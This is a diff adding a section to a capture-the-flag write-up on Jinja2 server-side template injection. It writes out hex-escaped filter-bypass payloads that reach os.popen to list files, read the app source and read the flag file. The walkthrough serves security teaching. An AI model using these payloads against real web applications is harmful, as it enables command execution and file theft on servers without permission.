@@ -136,6 +136,34 @@ but `print()` works:
 
 ![image](./pics/rce4.png)
 
-So the code probably has already imported `os` we need to find another way to get to the flag (either by using python code execution or accessing code variables like wit `{{request}}`) 
+So we can't exploit this vulnerability by using these functions. We also have to bypass `'`,`.`,`/`,`[`,`]`,`_`.
+Fortunately there is a solution to this as [swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) metions:
+> Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+> ```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}```
 
-I couldn't find the correct payload to use. 
+This payload uses hex values to inject filtered characters `\x5f` for `_`, so we can also use this technique, for example `\x2e` instead of `.`. This payload tries to get into *popen* based on the runnig code attributes and runs `id` command. We can use this payload but we have to replace `'` with `"`. We can use this payload to list server directory:
+```
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("ls")|attr("read")()}}
+```
+![image](./pics/ls.png)
+
+As you can see there are 4 files/folders here. *app.py* is the interesting one for us because this is the code that processed our input.
+
+Now we want to inspect *app.py* we can use this payload. To bypass `.` filtering, we have to use `app\2xEpy`:
+```
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat app\x2Epy")|attr("read")()}}
+```
+![image](./pics/code.png)
+
+As you can see server reads flag from `/tmp/parcham.txt`. So now we are one step away from obtaining the flag. both `/` and `.` are filtered so we can replace these characters: `\x2Ftmp\x2Fparcham\x2txt`.
+```
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat \x2Ftmp\x2Fparcham\x2txt")|attr("read")()}}
+```
+![image](./pics/parcham_filtered.png)
+
+It was not successful. Maybe tmp or parcham or txt are filtered. We can find out or we can simply use hex codes for the entire string: `\x2F\x74\x6D\x70\x2F\x70\x61\x72\x63\x68\x61\x6D\x2E\x74\x78\x74`
+
+```
+{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("cat \x2F\x74\x6D\x70\x2F\x70\x61\x72\x63\x68\x61\x6D\x2E\x74\x78\x74")|attr("read")()}}
+```
+![image](./pics/flag_2.png)
